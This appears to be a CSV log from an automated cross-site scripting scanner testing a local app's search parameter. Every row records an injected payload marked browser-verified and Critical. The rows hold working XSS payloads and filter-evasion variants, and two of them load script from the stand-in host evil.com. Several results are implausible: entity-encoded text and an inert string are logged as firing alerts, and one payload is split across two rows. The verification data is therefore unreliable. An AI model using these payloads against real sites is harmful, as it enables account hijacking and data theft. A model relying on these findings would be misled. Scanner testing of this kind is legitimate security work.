Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:23:33.408,2026-01-10 16:23:33.416,0.009,http://localhost:3000/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.416,2026-01-10 16:23:33.419,0.003,http://localhost:3000/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.420,2026-01-10 16:23:33.423,0.003,http://localhost:3000/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.423,2026-01-10 16:23:33.430,0.007,http://localhost:3000/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.430,2026-01-10 16:23:33.434,0.004,http://localhost:3000/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.434,2026-01-10 16:23:33.437,0.003,http://localhost:3000/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.437,2026-01-10 16:23:33.440,0.003,http://localhost:3000/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.440,2026-01-10 16:23:33.448,0.008,http://localhost:3000/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.448,2026-01-10 16:23:33.452,0.004,http://localhost:3000/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.452,2026-01-10 16:23:33.456,0.004,http://localhost:3000/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.456,2026-01-10 16:23:33.464,0.008,http://localhost:3000/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.464,2026-01-10 16:23:33.467,0.003,http://localhost:3000/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.467,2026-01-10 16:23:33.470,0.004,http://localhost:3000/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.470,2026-01-10 16:23:33.473,0.003,http://localhost:3000/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.473,2026-01-10 16:23:33.480,0.007,http://localhost:3000/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.480,2026-01-10 16:23:33.484,0.004,http://localhost:3000/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.484,2026-01-10 16:23:33.487,0.003,http://localhost:3000/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.487,2026-01-10 16:23:33.490,0.004,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.490,2026-01-10 16:23:33.498,0.007,http://localhost:3000/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.498,2026-01-10 16:23:33.502,0.004,http://localhost:3000/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.502,2026-01-10 16:23:33.505,0.003,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.505,2026-01-10 16:23:33.507,0.002,http://localhost:3000/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.507,2026-01-10 16:23:33.515,0.007,http://localhost:3000/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.515,2026-01-10 16:23:33.519,0.005,http://localhost:3000/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.520,2026-01-10 16:23:33.522,0.003,http://localhost:3000/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.522,2026-01-10 16:23:33.529,0.007,http://localhost:3000/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.529,2026-01-10 16:23:33.535,0.005,http://localhost:3000/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.535,2026-01-10 16:23:33.538,0.003,http://localhost:3000/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.538,2026-01-10 16:23:33.541,0.003,http://localhost:3000/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.541,2026-01-10 16:23:33.548,0.008,http://localhost:3000/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.548,2026-01-10 16:23:33.553,0.004,http://localhost:3000/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.553,2026-01-10 16:23:33.556,0.003,http://localhost:3000/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.556,2026-01-10 16:23:33.564,0.008,http://localhost:3000/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.564,2026-01-10 16:23:33.568,0.004,http://localhost:3000/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.568,2026-01-10 16:23:33.571,0.003,http://localhost:3000/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.571,2026-01-10 16:23:33.574,0.003,http://localhost:3000/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.574,2026-01-10 16:23:33.580,0.006,http://localhost:3000/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.580,2026-01-10 16:23:33.584,0.004,http://localhost:3000/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.584,2026-01-10 16:23:33.587,0.003,http://localhost:3000/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.587,2026-01-10 16:23:33.590,0.003,http://localhost:3000/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.590,2026-01-10 16:23:33.597,0.007,http://localhost:3000/search,GET,q,<input type=month onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.597,2026-01-10 16:23:33.601,0.004,http://localhost:3000/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.601,2026-01-10 16:23:33.605,0.003,http://localhost:3000/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.605,2026-01-10 16:23:33.612,0.008,http://localhost:3000/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.612,2026-01-10 16:23:33.616,0.004,http://localhost:3000/search,GET,q,<input type=button onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.617,2026-01-10 16:23:33.620,0.003,http://localhost:3000/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.620,2026-01-10 16:23:33.623,0.003,http://localhost:3000/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.623,2026-01-10 16:23:33.630,0.007,http://localhost:3000/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.630,2026-01-10 16:23:33.633,0.003,http://localhost:3000/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.633,2026-01-10 16:23:33.637,0.004,http://localhost:3000/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.637,2026-01-10 16:23:33.640,0.002,http://localhost:3000/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.640,2026-01-10 16:23:33.647,0.007,http://localhost:3000/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.647,2026-01-10 16:23:33.651,0.004,http://localhost:3000/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.651,2026-01-10 16:23:33.654,0.003,http://localhost:3000/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.654,2026-01-10 16:23:33.663,0.009,http://localhost:3000/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.663,2026-01-10 16:23:33.668,0.004,http://localhost:3000/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.668,2026-01-10 16:23:33.671,0.003,http://localhost:3000/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.671,2026-01-10 16:23:33.673,0.002,http://localhost:3000/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.673,2026-01-10 16:23:33.680,0.007,http://localhost:3000/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.681,2026-01-10 16:23:33.684,0.004,http://localhost:3000/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.684,2026-01-10 16:23:33.687,0.003,http://localhost:3000/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.687,2026-01-10 16:23:33.690,0.003,http://localhost:3000/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.690,2026-01-10 16:23:33.698,0.008,http://localhost:3000/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.698,2026-01-10 16:23:33.702,0.004,http://localhost:3000/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.702,2026-01-10 16:23:33.705,0.003,http://localhost:3000/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.705,2026-01-10 16:23:33.708,0.003,http://localhost:3000/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.708,2026-01-10 16:23:33.715,0.007,http://localhost:3000/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.715,2026-01-10 16:23:33.719,0.004,http://localhost:3000/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.719,2026-01-10 16:23:33.722,0.003,http://localhost:3000/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.722,2026-01-10 16:23:33.730,0.008,http://localhost:3000/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.730,2026-01-10 16:23:33.734,0.004,http://localhost:3000/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.734,2026-01-10 16:23:33.738,0.003,http://localhost:3000/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.738,2026-01-10 16:23:33.741,0.003,http://localhost:3000/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.741,2026-01-10 16:23:33.748,0.007,http://localhost:3000/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.748,2026-01-10 16:23:33.752,0.004,http://localhost:3000/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.752,2026-01-10 16:23:33.755,0.003,http://localhost:3000/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.755,2026-01-10 16:23:33.757,0.002,http://localhost:3000/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.757,2026-01-10 16:23:33.764,0.007,http://localhost:3000/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.764,2026-01-10 16:23:33.768,0.004,http://localhost:3000/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.768,2026-01-10 16:23:33.771,0.003,http://localhost:3000/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.771,2026-01-10 16:23:33.774,0.003,http://localhost:3000/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.774,2026-01-10 16:23:33.781,0.007,http://localhost:3000/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.781,2026-01-10 16:23:33.785,0.004,http://localhost:3000/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.785,2026-01-10 16:23:33.788,0.003,http://localhost:3000/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.788,2026-01-10 16:23:33.797,0.009,http://localhost:3000/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.797,2026-01-10 16:23:33.802,0.005,http://localhost:3000/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.802,2026-01-10 16:23:33.804,0.003,http://localhost:3000/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.804,2026-01-10 16:23:33.807,0.002,http://localhost:3000/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.807,2026-01-10 16:23:33.814,0.007,http://localhost:3000/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.814,2026-01-10 16:23:33.818,0.004,http://localhost:3000/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.819,2026-01-10 16:23:33.821,0.003,http://localhost:3000/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.821,2026-01-10 16:23:33.830,0.009,http://localhost:3000/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.830,2026-01-10 16:23:33.835,0.005,http://localhost:3000/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.835,2026-01-10 16:23:33.838,0.003,http://localhost:3000/search,GET,q,<font onmouseover=alert(1)>X</font>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.838,2026-01-10 16:23:33.840,0.002,http://localhost:3000/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.840,2026-01-10 16:23:33.848,0.007,http://localhost:3000/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.848,2026-01-10 16:23:33.852,0.004,http://localhost:3000/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.852,2026-01-10 16:23:33.855,0.003,http://localhost:3000/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.855,2026-01-10 16:23:33.858,0.003,http://localhost:3000/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.858,2026-01-10 16:23:33.866,0.008,http://localhost:3000/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.866,2026-01-10 16:23:33.869,0.003,http://localhost:3000/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.869,2026-01-10 16:23:33.872,0.003,http://localhost:3000/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.872,2026-01-10 16:23:33.875,0.002,http://localhost:3000/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.875,2026-01-10 16:23:33.883,0.009,http://localhost:3000/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.883,2026-01-10 16:23:33.887,0.003,http://localhost:3000/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.887,2026-01-10 16:23:33.890,0.003,http://localhost:3000/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.890,2026-01-10 16:23:33.897,0.007,http://localhost:3000/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.897,2026-01-10 16:23:33.901,0.005,http://localhost:3000/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.901,2026-01-10 16:23:33.904,0.003,http://localhost:3000/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.904,2026-01-10 16:23:33.908,0.003,http://localhost:3000/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.908,2026-01-10 16:23:33.916,0.009,http://localhost:3000/search,GET,q,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.916,2026-01-10 16:23:33.920,0.004,http://localhost:3000/search,GET,q,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
